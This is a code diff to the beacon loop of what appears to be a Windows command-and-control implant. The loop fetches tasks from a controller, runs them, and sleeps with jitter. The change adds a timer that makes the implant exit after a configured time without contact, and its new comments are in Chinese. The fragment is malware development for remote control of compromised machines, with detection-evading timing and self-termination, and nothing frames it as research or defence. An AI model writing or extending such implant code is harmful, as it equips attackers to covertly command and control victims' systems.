@@ -209,6 +209,8 @@ static void handle_task(Task *task) {
 
 // Main beacon loop
 static void beacon_loop(void) {
+  DWORD last_success_time = GetTickCount();
+
   while (1) {
     Task *tasks = NULL;
     int task_count = 0;
@@ -218,16 +220,33 @@ static void beacon_loop(void) {
     DEBUG_PRINT("    [DEBUG] beacon_ret=%d, task_count=%d\n", beacon_ret,
                 task_count);
 
-    if (beacon_ret == 0 && task_count > 0) {
-      // Process each task
-      for (int i = 0; i < task_count; i++) {
-        DEBUG_PRINT("    [DEBUG] Processing task %d: id=%s, cmd=%d, args=%s\n",
-                    i, tasks[i].id, tasks[i].command,
-                    tasks[i].args ? tasks[i].args : "(null)");
-        handle_task(&tasks[i]);
+    if (beacon_ret == 0) {
+      // 通信成功，重置计时
+      last_success_time = GetTickCount();
+
+      if (task_count > 0) {
+        // Process each task
+        for (int i = 0; i < task_count; i++) {
+          DEBUG_PRINT(
+              "    [DEBUG] Processing task %d: id=%s, cmd=%d, args=%s\n", i,
+              tasks[i].id, tasks[i].command,
+              tasks[i].args ? tasks[i].args : "(null)");
+          handle_task(&tasks[i]);
+        }
+        protocol_free_tasks(tasks, task_count);
       }
-      protocol_free_tasks(tasks, task_count);
     }
+
+    // 检查失联超时
+#if MAX_DISCONNECT_SECONDS > 0
+    {
+      DWORD elapsed = (GetTickCount() - last_success_time) / 1000;
+      if (elapsed >= MAX_DISCONNECT_SECONDS) {
+        DEBUG_PRINT("    [!] Disconnected for %lu seconds, exiting\n", elapsed);
+        break;
+      }
+    }
+#endif
 
     // Sleep with jitter (using dynamic beacon interval)
     sleep_with_jitter(g_beacon_interval, JITTER_PERCENT);
